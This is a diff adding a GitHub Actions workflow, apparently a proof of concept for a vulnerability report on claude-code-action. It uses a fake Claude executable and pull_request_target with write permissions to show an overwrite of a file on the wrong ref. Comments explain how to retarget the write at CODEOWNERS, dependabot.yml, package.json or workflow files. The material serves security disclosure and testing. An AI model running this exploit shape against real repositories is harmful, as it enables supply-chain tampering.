@@ -1,0 +1,48 @@
+name: Claude Hash Ref E2E PoC (supply-chain shape)
+
+# Fourth E2E variant. Same wrong-ref write primitive, but the seeded file
+# is a security-relevant repo path chosen via POC_SUPPLY_CHAIN_TARGET.
+# Attach the resulting run log + commit patch to demonstrate that the
+# wrong-ref write is not confined to a marker file.
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+
+jobs:
+  e2e-supply-chain:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      # Safe default. Change to `.github/CODEOWNERS`, `SECURITY.md`,
+      # `.github/dependabot.yml`, or `package.json` in the PoC repo to
+      # exercise the shape shown in the report.
+      POC_SUPPLY_CHAIN_TARGET: supply-chain-marker.txt
+      POC_SUPPLY_CHAIN_CONTENT: |
+        # Overwritten on the truncated ref by github_file_ops through
+        # claude-code-action. Change POC_SUPPLY_CHAIN_TARGET to point at
+        # CODEOWNERS, SECURITY.md, dependabot.yml, package.json, or a
+        # workflow file (with a workflows:write token) to reproduce the
+        # supply-chain-shape impact described in the report.
+    steps:
+      - name: Checkout base repository
+        uses: actions/checkout@v6
+
+      - name: Mark fake Claude executable
+        run: chmod +x .github/fake-claude-supply-chain-variant.mjs
+
+      - name: Run vulnerable Claude Code Action path (supply-chain variant)
+        uses: anthropics/claude-code-action@6c0083bb7289c31716797a039b6367b3079cc46e
+        with:
+          prompt: "PoC: write supply-chain marker using commit signing."
+          anthropic_api_key: "fake-key-not-used-by-fake-claude"
+          github_token: ${{ github.token }}
+          allowed_non_write_users: "s0kex"
+          use_commit_signing: true
+          path_to_claude_code_executable: ${{ github.workspace }}/.github/fake-claude-supply-chain-variant.mjs
+          show_full_output: "true"
